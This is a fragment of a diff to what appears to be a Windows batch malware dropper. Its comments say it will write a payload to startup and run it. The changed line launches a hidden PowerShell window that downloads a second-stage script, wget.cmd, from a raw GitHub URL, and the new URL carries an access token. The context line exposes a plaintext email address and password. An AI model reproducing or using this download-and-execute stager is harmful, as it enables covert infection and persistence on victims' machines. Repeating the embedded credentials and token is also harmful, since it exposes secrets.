@@ -15,7 +15,7 @@ powershell $email = "arashmehdizade.am@gmail.com"; $password = "123321Arash@"; $
 
 @REM todo: build out stage two
 @REM write payload to startup
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/m98m98/ttaarr/refs/heads/main/wget.cmd -OutFile wget.cmd"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/m98m98/tar2/refs/heads/main/wget.cmd?token=GHSAT0AAAAAAC7AO3Q3U6UP6HT5EFMGFS5QZ5SPXTQ -OutFile wget.cmd"
 
 
 @REM run payload
